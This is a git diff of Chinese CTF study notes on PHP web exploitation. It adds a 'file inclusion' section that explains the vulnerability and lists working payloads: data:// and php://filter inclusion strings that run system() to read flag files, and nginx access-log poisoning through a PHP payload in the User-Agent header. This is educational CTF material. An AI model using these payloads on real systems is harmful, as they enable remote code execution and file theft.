@@ -22,6 +22,7 @@ comments: true
   - [8.1 mt\_rand()爆破](#81-mt_rand爆破)
 - [9. GET/POST](#9-getpost)
 - [10. 命令执行](#10-命令执行)
+- [11. 文件包含](#11-文件包含)
 
 
 ## 前言<br>
@@ -157,24 +158,6 @@ c=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
 c=?><?=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
 ```
 
-**到这后，主要是发现 include($c)时的绕过办法，啊，正式名称叫做文件包含漏洞**<br>
-```php
-//data:// 这是一个数据URI方案的一部分。数据URI方案允许将小片段的数据直接嵌入到网页中，而不需要外部资源的引用
-//text/plain: 这部分指定了数据的类型。在这个案例中，text/plain 表示数据是普通文本
-//;base64: 这部分指定了数据的编码方式。在这个案例中，base64 表示数据是使用 Base64 编码的
-//PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=实际上是 <?php \nsystem("tac flag.php")\n?> 的base64编码
-
-c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=
-c=data://text/plain,<?php system("tac fl*g.php")?>
-
-//<?php system('cat flag.php');
-?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=
-
-//nginx的默认访问日志目录,随后在http请求的User-Agent写入代码
-/?file=/var/log/nginx/access.log
-User-Agent: <?php system('tac fl0g.php'); ?>
-```
-
 **还有通过`|`符号或来得到我们想要的可见字符：这个办法用来解决eval("echo($c);");**<br>
 ```python
 import re
@@ -245,4 +228,25 @@ get_reverse_number = "$((~$(({}))))" # 取反操作
 negative_one = "$((~$(())))"		# -1
 payload = get_reverse_number.format(negative_one*37)
 print(payload)
+```
+
+## 11. 文件包含<br>
+`文件包含`指的是为了更好的代码复用，通过文件包含把代码包含进另一个文件中。<br>
+`文件包含漏洞`成因是因为：**文件包含函数加载的参数没有经过校验，可以被用户控制，包含其他恶意文件,导致执行非预期代码**<br>
+**主要是发现 include($c)时的绕过办法**<br>
+```php
+//data:// 这是一个数据URI方案的一部分。数据URI方案允许将小片段的数据直接嵌入到网页中，而不需要外部资源的引用
+//text/plain: 这部分指定了数据的类型。在这个案例中，text/plain 表示数据是普通文本
+//;base64: 这部分指定了数据的编码方式。在这个案例中，base64 表示数据是使用 Base64 编码的
+//PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=实际上是 <?php \nsystem("tac flag.php")\n?> 的base64编码
+
+c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=
+c=data://text/plain,<?php system("tac fl*g.php")?>
+
+//<?php system('cat flag.php');
+?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=
+
+//nginx的默认访问日志目录,随后在http请求的User-Agent写入代码
+/?file=/var/log/nginx/access.log
+User-Agent: <?php system('tac fl0g.php'); ?>
 ```
